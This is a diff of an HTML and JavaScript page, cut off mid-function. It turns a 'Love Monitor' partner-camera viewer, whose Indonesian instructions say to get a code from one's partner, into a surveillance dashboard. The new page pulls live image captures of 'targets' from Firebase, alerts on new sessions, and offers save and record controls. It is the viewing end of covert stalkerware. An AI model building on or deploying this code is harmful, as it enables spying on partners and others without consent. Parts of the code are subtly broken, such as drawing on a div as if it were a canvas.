@@ -1,228 +1,280 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔍 Love Monitor</title>
+    <title>🔴 AI Monitoring Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0a;
-            color: #0f0;
-            font-family: monospace;
-            padding: 20px;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
             min-height: 100vh;
+            overflow-x: hidden;
         }
-        .container { max-width: 1000px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .title { color: #f0f; font-size: 2em; text-shadow: 0 0 10px #f0f; }
-        
-        .connection-panel {
-            background: #111;
-            padding: 25px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            border: 1px solid #333;
-        }
-        
-        .input-group {
-            margin: 20px 0;
-            text-align: center;
-        }
-        
-        input {
-            background: #222;
-            color: #0f0;
-            border: 2px solid #444;
-            padding: 15px;
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            max-width: 400px;
-            border-radius: 8px;
-            font-size: 18px;
+            height: 100%;
+            opacity: 0.05;
+            z-index: -1;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
             text-align: center;
-            letter-spacing: 3px;
-            font-family: monospace;
-            text-transform: uppercase;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #f0f;
-        }
-        
-        .button-group {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-            margin: 20px 0;
-            flex-wrap: wrap;
-        }
-        
-        button {
-            background: linear-gradient(45deg, #f0f, #0ff);
-            color: black;
-            border: none;
-            padding: 15px 25px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 16px;
-            min-width: 200px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        
-        #connectBtn {
-            background: linear-gradient(45deg, #4CAF50, #45a049);
-        }
-        
-        #disconnectBtn {
-            background: linear-gradient(45deg, #f44336, #d32f2f);
-        }
-        
-        .status-display {
-            background: #222;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            text-align: center;
-            border-left: 4px solid #f0f;
-            min-height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .connected {
-            border-left-color: #4CAF50;
-            background: #1a2b1a;
-        }
-        
-        .disconnected {
-            border-left-color: #f44336;
-            background: #2b1a1a;
-        }
-        
-        #videoContainer {
-            background: #000;
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 20px 0;
-            border: 3px solid #f0f;
-            min-height: 400px;
+            padding: 30px;
+            border-bottom: 2px solid #00ff41;
+            margin-bottom: 30px;
             position: relative;
         }
-        
-        #remoteVideo {
+        .title {
+            font-size: 3em;
+            text-shadow: 0 0 10px #00ff41;
+            letter-spacing: 3px;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #aaa;
+            font-size: 1.2em;
+        }
+        .stats-bar {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        .stat-card {
+            background: rgba(0, 255, 65, 0.05);
+            border: 1px solid rgba(0, 255, 65, 0.2);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s;
+        }
+        .stat-card:hover {
+            transform: translateY(-5px);
+            border-color: #00ff41;
+        }
+        .stat-value {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #00ff41;
+            display: block;
+            text-shadow: 0 0 10px #00ff41;
+        }
+        .stat-label {
+            color: #aaa;
+            font-size: 0.9em;
+            margin-top: 10px;
+        }
+        .live-feeds {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .feed-card {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            overflow: hidden;
+            border: 2px solid #ff003c;
+            position: relative;
+        }
+        .feed-header {
+            background: rgba(255, 0, 60, 0.2);
+            padding: 15px;
+            border-bottom: 1px solid #ff003c;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .feed-title {
+            font-size: 1.2em;
+            color: #ff003c;
+        }
+        .feed-status {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            font-weight: bold;
+        }
+        .online { background: rgba(0, 255, 65, 0.2); color: #00ff41; }
+        .offline { background: rgba(255, 0, 60, 0.2); color: #ff003c; }
+        .feed-image {
             width: 100%;
+            height: 300px;
+            object-fit: cover;
+            background: #000;
             display: block;
         }
-        
-        .video-placeholder {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: #666;
-            text-align: center;
-            font-size: 18px;
-        }
-        
-        .log {
-            background: #111;
+        .feed-info {
             padding: 15px;
+            background: rgba(0, 0, 0, 0.8);
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        .control-btn {
+            background: rgba(255, 0, 60, 0.2);
+            color: white;
+            border: 1px solid #ff003c;
+            padding: 8px 15px;
             border-radius: 5px;
-            height: 200px;
-            overflow-y: auto;
-            margin-top: 20px;
+            cursor: pointer;
+            font-size: 0.9em;
+            transition: all 0.3s;
+        }
+        .control-btn:hover {
+            background: #ff003c;
+        }
+        .sessions-list {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
             border: 1px solid #333;
         }
-        
+        .session-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            border-left: 4px solid #00ff41;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .log-panel {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            border: 1px solid #333;
+            height: 400px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .log-content {
+            flex: 1;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+        }
         .log-entry {
             padding: 8px 0;
             border-bottom: 1px solid #222;
-            font-size: 14px;
+            font-size: 0.9em;
         }
-        
         .log-time {
-            color: #0ff;
-            font-size: 12px;
+            color: #00ff41;
+            font-size: 0.8em;
+            margin-right: 10px;
         }
-        
-        .instructions {
-            background: #1a1a2e;
+        .alert {
             padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            border-left: 4px solid #0ff;
+            border-radius: 10px;
+            margin: 15px 0;
+            text-align: center;
+            font-weight: bold;
+            animation: pulse 2s infinite;
         }
-        
-        .instructions ol {
-            margin-left: 20px;
-            margin-top: 10px;
+        .alert-new {
+            background: rgba(255, 0, 60, 0.2);
+            border: 2px solid #ff003c;
+            color: #ff003c;
         }
-        
-        .instructions li {
-            margin: 8px 0;
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        .footer {
+            text-align: center;
+            margin-top: 50px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+            color: #666;
+            font-size: 0.9em;
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
+    <div class="matrix-bg" id="matrixBg"></div>
+    
     <div class="container">
         <div class="header">
-            <h1 class="title">💘 LOVE MONITOR</h1>
-            <p>Real-time WebRTC Surveillance System</p>
+            <h1 class="title">🔴 AI MONITORING DASHBOARD</h1>
+            <p class="subtitle">Real-time Surveillance System • 24/7 Operation</p>
         </div>
         
-        <div class="instructions">
-            <strong>📋 CARA PAKAI:</strong>
-            <ol>
-                <li>Minta <strong>KODE 6 DIGIT</strong> dari pacarmu</li>
-                <li>Masukkan kode di bawah</li>
-                <li>Klik <strong>CONNECT</strong></li>
-                <li>Tunggu hingga terhubung</li>
-            </ol>
+        <div class="alert alert-new" id="newSessionAlert" style="display: none;">
+            🚨 NEW SESSION DETECTED! Auto-monitoring activated.
         </div>
         
-        <div class="connection-panel">
-            <div class="input-group">
-                <input type="text" 
-                       id="roomInput" 
-                       placeholder="MASUKKAN KODE 6 DIGIT" 
-                       maxlength="6"
-                       oninput="this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '')">
+        <div class="stats-bar">
+            <div class="stat-card">
+                <span class="stat-value" id="totalSessions">0</span>
+                <span class="stat-label">ACTIVE SESSIONS</span>
             </div>
-            
-            <div class="button-group">
-                <button onclick="connectToRoom()" id="connectBtn">
-                    🔗 CONNECT
-                </button>
-                <button onclick="disconnect()" id="disconnectBtn" disabled>
-                    ✖️ DISCONNECT
-                </button>
+            <div class="stat-card">
+                <span class="stat-value" id="totalCaptures">0</span>
+                <span class="stat-label">TOTAL CAPTURES</span>
             </div>
-            
-            <div class="status-display disconnected" id="statusDisplay">
-                🔴 MENUNGGU KODE ROOM
+            <div class="stat-card">
+                <span class="stat-value" id="uptime">00:00:00</span>
+                <span class="stat-label">SYSTEM UPTIME</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-value" id="lastUpdate">0s</span>
+                <span class="stat-label">LAST UPDATE</span>
             </div>
         </div>
         
-        <div id="videoContainer">
-            <div class="video-placeholder" id="videoPlaceholder">
-                🎥 Video akan muncul di sini setelah terhubung
+        <div id="liveFeeds" class="live-feeds">
+            <!-- Live feeds will be inserted here -->
+            <div class="feed-card" id="noFeeds">
+                <div class="feed-header">
+                    <div class="feed-title">🕵️‍♂️ NO ACTIVE SESSIONS</div>
+                    <div class="feed-status offline">OFFLINE</div>
+                </div>
+                <div style="padding: 50px; text-align: center; color: #666;">
+                    <i class="fas fa-video-slash" style="font-size: 3em; margin-bottom: 20px;"></i>
+                    <p>Waiting for targets to connect...</p>
+                </div>
             </div>
-            <video id="remoteVideo" autoplay playsinline></video>
         </div>
         
-        <div class="log" id="log">
-            <div class="log-entry">
-                <span class="log-time">[System]</span> Monitor siap menerima koneksi
+        <div class="sessions-list">
+            <h2><i class="fas fa-list"></i> ACTIVE SESSIONS</h2>
+            <div id="sessionsContainer">
+                <!-- Sessions will be listed here -->
             </div>
+        </div>
+        
+        <div class="log-panel">
+            <h2><i class="fas fa-terminal"></i> SYSTEM LOG</h2>
+            <div class="log-content" id="logContent">
+                <!-- Logs will appear here -->
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p><i class="fas fa-shield-alt"></i> ZING-ZANG Surveillance System v4.0 • Permanent Monitoring Active</p>
+            <p style="margin-top: 10px; color: #00ff41;">
+                ⚡ System Status: <span id="systemStatus">OPERATIONAL</span>
+            </p>
         </div>
     </div>
 
@@ -246,269 +298,239 @@
         const database = firebase.database();
         
         // ========== VARIABLES ==========
-        let peerConnection;
-        let roomId;
-        let answerListener;
-        let candidateListener;
+        let activeSessions = {};
+        let totalCaptures = 0;
+        let systemStartTime = Date.now();
+        let lastUpdateTime = Date.now();
         
-        // ========== GET ROOM ID FROM INPUT ==========
-        function getRoomId() {
-            return document.getElementById('roomInput').value.trim().toUpperCase();
-        }
-        
-        // ========== CONNECT TO ROOM ==========
-        async function connectToRoom() {
-            roomId = getRoomId();
+        // ========== MATRIX BACKGROUND ==========
+        function initMatrixBackground() {
+            const canvas = document.getElementById('matrixBg');
+            const ctx = canvas.getContext('2d');
             
-            if (!roomId || roomId.length !== 6) {
-                log("❌ Masukkan kode 6 digit yang valid!");
-                return;
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const chars = "01";
+            const charArray = chars.split("");
+            const drops = [];
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            
+            for(let i = 0; i < columns; i++) {
+                drops[i] = Math.random() * canvas.height;
             }
             
-            const connectBtn = document.getElementById('connectBtn');
-            const disconnectBtn = document.getElementById('disconnectBtn');
-            const statusDisplay = document.getElementById('statusDisplay');
-            
-            connectBtn.disabled = true;
-            disconnectBtn.disabled = false;
-            connectBtn.innerHTML = "🔄 CONNECTING...";
-            
-            statusDisplay.className = "status-display disconnected";
-            statusDisplay.innerHTML = "🔄 Mencari room...";
-            
-            log(`🔍 Mencari room: ${roomId}`);
-            
-            try {
-                // Check if room exists
-                const snapshot = await database.ref('rooms/' + roomId).once('value');
-                if (!snapshot.exists() || !snapshot.val().active) {
-                    throw new Error("Room tidak ditemukan atau tidak aktif!");
-                }
+            function draw() {
+                ctx.fillStyle = "rgba(10, 10, 10, 0.05)";
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
                 
-                log("✅ Room ditemukan! Membuat koneksi WebRTC...");
+                ctx.fillStyle = "#0F0";
+                ctx.font = `${fontSize}px monospace`;
                 
-                // Setup WebRTC
-                await setupWebRTC();
-                
-                // Create and send offer
-                const offer = await peerConnection.createOffer({
-                    offerToReceiveVideo: true,
-                    offerToReceiveAudio: false
-                });
-                
-                await peerConnection.setLocalDescription(offer);
-                
-                // Clean old offer first
-                await database.ref(`rooms/${roomId}/offer`).remove();
-                
-                // Send offer to target
-                await database.ref(`rooms/${roomId}/offer`).set(offer);
-                log("📤 Offer terkirim ke target");
-                
-                // Setup listeners
-                setupListeners();
-                
-                // Update UI
-                statusDisplay.className = "status-display disconnected";
-                statusDisplay.innerHTML = "🟡 MENUNGGU RESPONSE TARGET...";
-                
-            } catch (error) {
-                log(`❌ Error: ${error.message}`);
-                
-                connectBtn.disabled = false;
-                disconnectBtn.disabled = true;
-                connectBtn.innerHTML = "🔗 CONNECT";
-                
-                statusDisplay.className = "status-display disconnected";
-                statusDisplay.innerHTML = `🔴 ${error.message}`;
-                
-                // Auto-retry in 5 seconds
-                setTimeout(() => {
-                    if (!peerConnection || peerConnection.connectionState !== 'connected') {
-                        log("🔄 Mencoba kembali...");
-                        connectToRoom();
+                for(let i = 0; i < drops.length; i++) {
+                    const text = charArray[Math.floor(Math.random() * charArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
                     }
-                }, 5000);
+                    drops[i]++;
+                }
             }
-        }
-        
-        // ========== WEBRTC SETUP ==========
-        function setupWebRTC() {
-            peerConnection = new RTCPeerConnection({
-                iceServers: [
-                    { urls: 'stun:stun.l.google.com:19302' },
-                    { urls: 'stun:stun1.l.google.com:19302' }
-                ]
-            });
             
-            // Handle incoming stream
-            peerConnection.ontrack = (event) => {
-                log("🎥 Stream video diterima!");
-                
-                const video = document.getElementById('remoteVideo');
-                const placeholder = document.getElementById('videoPlaceholder');
-                
-                video.srcObject = event.streams[0];
-                placeholder.style.display = 'none';
-                video.style.display = 'block';
-                
-                document.getElementById('statusDisplay').className = "status-display connected";
-                document.getElementById('statusDisplay').innerHTML = "🟢 LIVE - TERHUBUNG!";
-                
-                log("✅ Koneksi WebRTC berhasil!");
-            };
+            setInterval(draw, 35);
             
-            // ICE candidate handler
-            peerConnection.onicecandidate = (event) => {
-                if (event.candidate) {
-                    database.ref(`rooms/${roomId}/spyCandidates`).push(event.candidate.toJSON());
-                }
-            };
-            
-            // Connection state
-            peerConnection.onconnectionstatechange = () => {
-                const state = peerConnection.connectionState;
-                log(`Status koneksi: ${state}`);
-                
-                if (state === 'connected') {
-                    document.getElementById('statusDisplay').innerHTML = "🔴 LIVE - STREAM AKTIF";
-                } else if (state === 'disconnected' || state === 'failed' || state === 'closed') {
-                    handleDisconnection();
-                }
-            };
-        }
-        
-        // ========== SETUP LISTENERS ==========
-        function setupListeners() {
-            // Listen for answer from target
-            answerListener = database.ref(`rooms/${roomId}/answer`).on('value', async (snapshot) => {
-                const answer = snapshot.val();
-                if (answer && peerConnection.signalingState === 'have-local-offer') {
-                    log("📥 Answer diterima dari target");
-                    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
-                }
-            });
-            
-            // Listen for target ICE candidates
-            candidateListener = database.ref(`rooms/${roomId}/targetCandidates`).on('child_added', async (snapshot) => {
-                const candidate = snapshot.val();
-                if (candidate) {
-                    try {
-                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-                        log("✅ ICE candidate ditambahkan");
-                    } catch (e) {
-                        log(`⚠️ ICE error: ${e.message}`);
-                    }
-                }
+            window.addEventListener('resize', () => {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
             });
         }
         
-        // ========== DISCONNECT ==========
-        function disconnect() {
-            cleanup();
-            
-            document.getElementById('connectBtn').disabled = false;
-            document.getElementById('disconnectBtn').disabled = true;
-            document.getElementById('connectBtn').innerHTML = "🔗 CONNECT";
-            
-            document.getElementById('statusDisplay').className = "status-display disconnected";
-            document.getElementById('statusDisplay').innerHTML = "🔴 TERPUTUS";
-            
-            const video = document.getElementById('remoteVideo');
-            const placeholder = document.getElementById('videoPlaceholder');
-            
-            video.style.display = 'none';
-            placeholder.style.display = 'block';
-            
-            log("✖️ Koneksi diputus");
-        }
-        
-        // ========== HANDLE DISCONNECTION ==========
-        function handleDisconnection() {
-            log("⚠️ Koneksi terputus!");
-            
-            document.getElementById('statusDisplay').className = "status-display disconnected";
-            document.getElementById('statusDisplay').innerHTML = "🔄 MENCARI ULANG...";
-            
-            // Auto-reconnect
-            setTimeout(() => {
-                if (roomId && (!peerConnection || peerConnection.connectionState !== 'connected')) {
-                    log("🔄 Mencoba reconnect...");
-                    connectToRoom();
-                }
-            }, 3000);
-        }
-        
-        // ========== CLEANUP ==========
-        function cleanup() {
-            // Remove Firebase listeners
-            if (answerListener) database.ref(`rooms/${roomId}/answer`).off('value', answerListener);
-            if (candidateListener) database.ref(`rooms/${roomId}/targetCandidates`).off('child_added', candidateListener);
-            
-            // Close WebRTC connection
-            if (peerConnection) {
-                peerConnection.close();
-                peerConnection = null;
-            }
-            
-            // Clear video stream
-            const video = document.getElementById('remoteVideo');
-            if (video.srcObject) {
-                video.srcObject.getTracks().forEach(track => track.stop());
-                video.srcObject = null;
-            }
-        }
-        
-        // ========== LOG UTILITY ==========
-        function log(message) {
-            const logDiv = document.getElementById('log');
-            const entry = document.createElement('div');
-            entry.className = "log-entry";
-            
-            const time = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
-            entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
-            
-            logDiv.appendChild(entry);
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-        
-        // ========== AUTO-CONNECT FROM URL ==========
-        function checkURLForRoom() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const roomFromURL = urlParams.get('room');
-            
-            if (roomFromURL && roomFromURL.length === 6) {
-                document.getElementById('roomInput').value = roomFromURL.toUpperCase();
-                log(`📥 Room ID dari URL: ${roomFromURL}`);
+        // ========== MONITOR SESSIONS ==========
+        function startMonitoring() {
+            // Monitor active sessions
+            database.ref('sessions').orderByChild('status').equalTo('active').on('value', (snapshot) => {
+                const sessions = snapshot.val() || {};
+                activeSessions = sessions;
                 
-                // Auto-connect after 1 second
-                setTimeout(() => {
-                    connectToRoom();
-                }, 1000);
-            }
-        }
-        
-        // ========== INITIALIZATION ==========
-        window.onload = function() {
-            log("🟢 Sistem monitor siap");
+                updateSessionCount();
+                updateSessionsList();
+                checkForNewSessions(sessions);
+            });
             
-            // Check for room ID in URL
-            checkURLForRoom();
-            
-            // Auto-focus input
-            document.getElementById('roomInput').focus();
-            
-            // Enable Enter key to connect
-            document.getElementById('roomInput').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    connectToRoom();
+            // Monitor captures in real-time
+            database.ref('captures').limitToLast(1).on('child_added', (snapshot) => {
+                const capture = snapshot.val();
+                if (capture) {
+                    totalCaptures++;
+                    lastUpdateTime = Date.now();
+                    
+                    document.getElementById('totalCaptures').textContent = totalCaptures;
+                    document.getElementById('lastUpdate').textContent = 'NOW';
+                    
+                    // Update the corresponding feed
+                    updateFeed(capture);
+                    
+                    // Log the capture
+                    log(`📸 Capture from ${capture.sessionId ? capture.sessionId.substring(0, 8) : 'unknown'}`);
+                    
+                    // Reset last update counter
+                    setTimeout(() => {
+                        const elapsed = Math.floor((Date.now() - lastUpdateTime) / 1000);
+                        document.getElementById('lastUpdate').textContent = elapsed + 's';
+                    }, 1000);
                 }
             });
-        };
+            
+            // Count total captures on load
+            database.ref('captures').once('value').then(snapshot => {
+                totalCaptures = snapshot.numChildren();
+                document.getElementById('totalCaptures').textContent = totalCaptures;
+            });
+        }
         
-        // Cleanup on page unload
-        window.addEventListener('beforeunload', cleanup);
-        window.addEventListener('pagehide', cleanup);
-    </script>
-</body>
-    </html>
+        // ========== UPDATE SESSION COUNT ==========
+        function updateSessionCount() {
+            const sessionCount = Object.keys(activeSessions).length;
+            document.getElementById('totalSessions').textContent = sessionCount;
+            
+            if (sessionCount === 0) {
+                document.getElementById('noFeeds').style.display = 'block';
+            } else {
+                document.getElementById('noFeeds').style.display = 'none';
+            }
+        }
+        
+        // ========== CHECK FOR NEW SESSIONS ==========
+        function checkForNewSessions(sessions) {
+            const sessionIds = Object.keys(sessions);
+            
+            sessionIds.forEach(sessionId => {
+                if (!document.getElementById(`session-${sessionId}`)) {
+                    // New session detected!
+                    const session = sessions[sessionId];
+                    
+                    // Show alert
+                    const alert = document.getElementById('newSessionAlert');
+                    alert.style.display = 'block';
+                    alert.innerHTML = `🚨 NEW SESSION DETECTED! ${session.platform || 'Unknown device'}`;
+                    
+                    setTimeout(() => {
+                        alert.style.display = 'none';
+                    }, 5000);
+                    
+                    // Create feed for new session
+                    createFeed(sessionId, session);
+                    
+                    log(`🆕 New session: ${sessionId.substring(0, 8)} from ${session.platform || 'unknown'}`);
+                }
+            });
+        }
+        
+        // ========== CREATE FEED FOR SESSION ==========
+        function createFeed(sessionId, session) {
+            const feedsContainer = document.getElementById('liveFeeds');
+            
+            // Remove "no feeds" message if present
+            if (document.getElementById('noFeeds').style.display !== 'none') {
+                document.getElementById('noFeeds').style.display = 'none';
+            }
+            
+            // Check if feed already exists
+            if (document.getElementById(`feed-${sessionId}`)) return;
+            
+            const feedHTML = `
+                <div class="feed-card" id="feed-${sessionId}">
+                    <div class="feed-header">
+                        <div class="feed-title">
+                            <i class="fas fa-user"></i> SESSION: ${sessionId.substring(0, 8)}
+                        </div>
+                        <div class="feed-status online" id="status-${sessionId}">
+                            ONLINE
+                        </div>
+                    </div>
+                    <img class="feed-image" id="image-${sessionId}" src="" alt="Live Feed">
+                    <div class="feed-info">
+                        <div><strong>Started:</strong> ${new Date(session.started).toLocaleTimeString()}</div>
+                        <div><strong>Device:</strong> ${session.platform || 'Unknown'}</div>
+                        <div><strong>Last Active:</strong> <span id="lastactive-${sessionId}">Just now</span></div>
+                        <div class="controls">
+                            <button class="control-btn" onclick="saveSessionImage('${sessionId}')">
+                                <i class="fas fa-save"></i> Save
+                            </button>
+                            <button class="control-btn" onclick="recordSession('${sessionId}')">
+                                <i class="fas fa-record-vinyl"></i> Record
+                            </button>
+                            <button class="control-btn" onclick="viewSessionDetails('${sessionId}')">
+                                <i class="fas fa-info"></i> Details
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            feedsContainer.insertAdjacentHTML('afterbegin', feedHTML);
+        }
+        
+        // ========== UPDATE FEED WITH NEW IMAGE ==========
+        function updateFeed(capture) {
+            const sessionId = capture.sessionId;
+            if (!sessionId) return;
+            
+            const imgElement = document.getElementById(`image-${sessionId}`);
+            if (imgElement) {
+                imgElement.src = capture.image;
+                
+                // Update last active time
+                const lastActiveElement = document.getElementById(`lastactive-${sessionId}`);
+                if (lastActiveElement) {
+                    lastActiveElement.textContent = 'Just now';
+                }
+            } else {
+                // Feed doesn't exist yet, create it
+                const session = activeSessions[sessionId];
+                if (session) {
+                    createFeed(sessionId, session);
+                    setTimeout(() => {
+                        const imgElement = document.getElementById(`image-${sessionId}`);
+                        if (imgElement) {
+                            imgElement.src = capture.image;
+                        }
+                    }, 100);
+                }
+            }
+        }
+        
+        // ========== UPDATE SESSIONS LIST ==========
+        function updateSessionsList() {
+            const container = document.getElementById('sessionsContainer');
+            container.innerHTML = '';
+            
+            Object.keys(activeSessions).forEach(sessionId => {
+                const session = activeSessions[sessionId];
+                const sessionAge = Math.floor((Date.now() - session.started) / 1000);
+                const minutes = Math.floor(sessionAge / 60);
+                const seconds = sessionAge % 60;
+                
+                const sessionHTML = `
+                    <div class="session-item">
+                        <div>
+                            <strong>${sessionId.substring(0, 8)}</strong><br>
+                            <small>${session.platform || 'Unknown'} • ${minutes}m ${seconds}s</small>
+                        </div>
+                        <div>
+                            <button class="control-btn" onclick="focusSession('${sessionId}')">
+                                <i class="fas fa-eye"></i> View
+                            </button>
+                        </div>
+                    </div>
+                `;
+                
+                container.insertAdjacentHTML('beforeend', sessionHTML);
+            });
+        }
+        
+        // ========== CONTROL FUNCTIONS ==========
+        function saveSessionImage(sessionId) {
+            const img
